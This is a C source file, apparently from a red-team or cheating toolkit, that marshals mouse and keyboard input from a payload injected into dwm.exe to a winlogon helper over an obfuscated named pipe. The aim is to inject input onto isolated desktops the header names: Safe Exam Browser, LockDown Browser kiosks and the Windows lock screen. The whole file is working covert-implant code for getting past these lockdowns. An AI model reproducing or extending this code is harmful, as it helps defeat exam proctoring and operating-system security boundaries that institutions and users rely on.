/* ================================================================== *
 * secure_inject.c -- Cross-desktop input injection via the winlogon    *
 * helper's reverse-inject pipe.                                        *
 *                                                                     *
 * v17 (2026-09-23). The payload lives in dwm.exe on winsta0\Default.   *
 * On secure/isolated desktops (SEB, LDB kiosk, WinLogon lock) our      *
 * SendInput does NOT reach the active desktop -- SendInput posts to    *
 * the CALLING THREAD's desktop, and switching desktops on the DWM      *
 * compositor thread would violate an ordering invariant that Windows   *
 * enforces internally (verified 2026-09-21: SetThreadDesktop from      *
 * inside DWM crashes the compositor).                                  *
 *                                                                     *
 * The winlogon helper (`tools/redteam/probes/wl_input.c`) hosts a      *
 * duplex request/reply named pipe (`obf_pipe_iso_cmd()`) with a small  *
 * fixed 12-byte header (magic 'UAA\0' + opcode + payload_len). Before  *
 * v17 the pipe carried only UIA queries; v17 adds INJECT opcodes so    *
 * SendInput calls can be marshalled to a helper thread that first      *
 * SetThreadDesktop(active) then makes the syscall.                     *
 *                                                                     *
 * Availability model:                                                  *
 *   sec_inject_available() returns 1 iff the pipe is currently         *
 *   reachable AND the last INJECT call succeeded. First call probes    *
 *   the pipe with a cheap `WaitNamedPipeA(...100 ms)`; if that fails   *
 *   we go back to "unavailable" for 5 s (rate-limits the retry so we   *
 *   don't pound the pipe when helper is genuinely absent).             *
 *                                                                     *
 *   inj.c only invokes secure_inject paths when the caller sets        *
 *   `inj_set_secure(1)` AND `sec_inject_available()` returns 1, so     *
 *   this file's "unavailable" mode falls through cleanly to the local  *
 *   SendInput fallback in inject.c.                                    *
 * ================================================================== */
#include "../../../shared/common.h"
#include "secure_inject.h"
#include "../../../shared/inject_cmd.h"
#include "../../../shared/log_secure.h"

#include <windows.h>
#include <stdint.h>
#include <string.h>

/* From shared/obf_names.c -- GUID-per-install NetSvcCoord-style pipe name. */
extern const char *obf_pipe_iso_cmd(void);

/* ── Overlapped-I/O helpers (matches ground.cpp's uia_rpc) ────────── */
#define SEC_INJ_WAIT_MS   100    /* WaitNamedPipe timeout */
#define SEC_INJ_WRITE_MS  200
#define SEC_INJ_READ_MS   250

static int overlapped_wait(HANDLE h, OVERLAPPED *ov, DWORD to_ms, DWORD *out) {
    DWORD w = WaitForSingleObject(ov->hEvent, to_ms);
    if (w != WAIT_OBJECT_0) {
        CancelIoEx(h, ov);
        DWORD dummy = 0;
        GetOverlappedResult(h, ov, &dummy, TRUE);
        return 0;
    }
    return GetOverlappedResult(h, ov, out, FALSE) ? 1 : 0;
}

/* Fire one CMD_OP_INJ_* request against the helper. Returns 1 on
 * accepted-and-fired, 0 on any error. */
static int sec_inject_rpc(uint32_t opcode,
                          const void *payload, uint32_t payload_len) {
    const char *pipe = obf_pipe_iso_cmd();
    if (!pipe || !*pipe) return 0;

    /* Fast-fail probe -- no 30 s implicit wait if helper is gone. */
    if (!WaitNamedPipeA(pipe, SEC_INJ_WAIT_MS)) return 0;

    HANDLE h = CreateFileA(pipe, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    HANDLE ev = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!ev) { CloseHandle(h); return 0; }

    int ok = 0;
    DWORD n = 0;
    OVERLAPPED ov = {0};
    ov.hEvent = ev;

    cmd_hdr_t req = { CMD_MAGIC, opcode, payload_len };
    cmd_hdr_t rep = {0};

    /* Write header. */
    ResetEvent(ev);
    if (!WriteFile(h, &req, sizeof(req), NULL, &ov) &&
        GetLastError() != ERROR_IO_PENDING) goto done;
    if (!overlapped_wait(h, &ov, SEC_INJ_WRITE_MS, &n) || n != sizeof(req)) goto done;

    /* Write payload if any. */
    if (payload_len && payload) {
        ResetEvent(ev);
        if (!WriteFile(h, payload, payload_len, NULL, &ov) &&
            GetLastError() != ERROR_IO_PENDING) goto done;
        if (!overlapped_wait(h, &ov, SEC_INJ_WRITE_MS, &n) || n != payload_len) goto done;
    }

    /* Read reply header. */
    ResetEvent(ev);
    if (!ReadFile(h, &rep, sizeof(rep), NULL, &ov) &&
        GetLastError() != ERROR_IO_PENDING) goto done;
    if (!overlapped_wait(h, &ov, SEC_INJ_READ_MS, &n) || n != sizeof(rep)) goto done;
    if (rep.magic != CMD_MAGIC || rep.opcode != opcode) goto done;

    /* Read reply body (single byte) if any. */
    if (rep.payload_len == sizeof(cmd_inj_reply_t)) {
        cmd_inj_reply_t rr = {0};
        ResetEvent(ev);
        if (!ReadFile(h, &rr, sizeof(rr), NULL, &ov) &&
            GetLastError() != ERROR_IO_PENDING) goto done;
        if (!overlapped_wait(h, &ov, SEC_INJ_READ_MS, &n) || n != sizeof(rr)) goto done;
        ok = rr.ok ? 1 : 0;
    } else if (rep.payload_len == 0) {
        /* Some older helpers may reply header-only on success. */
        ok = 1;
    } else {
        /* Unexpected reply length -- drain and drop. */
        char drain[64];
        while (rep.payload_len > 0) {
            DWORD want = rep.payload_len > sizeof(drain) ? (DWORD)sizeof(drain) : rep.payload_len;
            ResetEvent(ev);
            if (!ReadFile(h, drain, want, NULL, &ov) &&
                GetLastError() != ERROR_IO_PENDING) goto done;
            if (!overlapped_wait(h, &ov, SEC_INJ_READ_MS, &n) || n != want) goto done;
            rep.payload_len -= want;
        }
        ok = 0;
    }

done:
    CloseHandle(ev);
    CloseHandle(h);
    return ok;
}

/* ── Availability cache -- avoid slamming the pipe when helper is gone ── */
static volatile LONG   g_last_probe_ok  = 0;
static volatile LONG64 g_last_probe_tick = 0;
#define AVAIL_PROBE_MS_OK    1500   /* re-check every 1.5 s while OK */
#define AVAIL_PROBE_MS_BAD   5000   /* back off to 5 s while broken  */

int sec_inject_available(void) {
    LONG64 now = (LONG64)GetTickCount64();
    LONG   ok  = InterlockedCompareExchange(&g_last_probe_ok, 0, 0);
    LONG64 last = 0;
    /* Atomically read last tick (64-bit assign is not atomic on all
     * archs, so guard with InterlockedCompareExchange64). */
    last = InterlockedCompareExchange64(&g_last_probe_tick, 0, 0);
    int   interval = ok ? AVAIL_PROBE_MS_OK : AVAIL_PROBE_MS_BAD;
    if (now - last < interval) return ok;

    /* Probe with a cheap zero-payload SNAP-look-up-alike: use
     * WaitNamedPipe as the presence check. We do NOT open the pipe
     * for a real INJECT here -- that would burn a helper instance
     * cycle. The actual INJECT calls also fail-fast via WaitNamedPipe,
     * so this two-tier check is just to keep sec_inject_available()
     * cheap for the "should I bother going remote?" callers. */
    const char *pipe = obf_pipe_iso_cmd();
    int fresh = (pipe && *pipe && WaitNamedPipeA(pipe, 60)) ? 1 : 0;
    InterlockedExchange(&g_last_probe_ok,  fresh);
    InterlockedExchange64(&g_last_probe_tick, now);
    return fresh;
}

int sec_inject_move_abs(int nx, int ny) {
    if (nx < 0) nx = 0; else if (nx > 65535) nx = 65535;
    if (ny < 0) ny = 0; else if (ny > 65535) ny = 65535;
    cmd_inj_mouse_move_t p = { (uint16_t)nx, (uint16_t)ny };
    return sec_inject_rpc(CMD_OP_INJ_MOUSE_MOVE, &p, sizeof(p));
}

int sec_inject_button(unsigned int mouseeventf) {
    cmd_inj_mouse_btn_t p = { (uint32_t)mouseeventf };
    return sec_inject_rpc(CMD_OP_INJ_MOUSE_BTN, &p, sizeof(p));
}

int sec_inject_wheel(int delta) {
    cmd_inj_mouse_whl_t p = { (int32_t)delta };
    return sec_inject_rpc(CMD_OP_INJ_MOUSE_WHL, &p, sizeof(p));
}

int sec_inject_key_unicode(unsigned short cp, int up) {
    cmd_inj_key_uni_t p = { (uint16_t)cp, (uint8_t)(up ? 1 : 0), 0 };
    return sec_inject_rpc(CMD_OP_INJ_KEY_UNI, &p, sizeof(p));
}

int sec_inject_key_vk(unsigned short vk, int up, int extended) {
    cmd_inj_key_vk_t p = { (uint16_t)vk, (uint8_t)(up ? 0 : 1),
                           (uint8_t)(extended ? 1 : 0) };
    /* Note: cmd_inj_key_vk_t stores DOWN=1/UP=0 -- convert here. */
    return sec_inject_rpc(CMD_OP_INJ_KEY_VK, &p, sizeof(p));
}
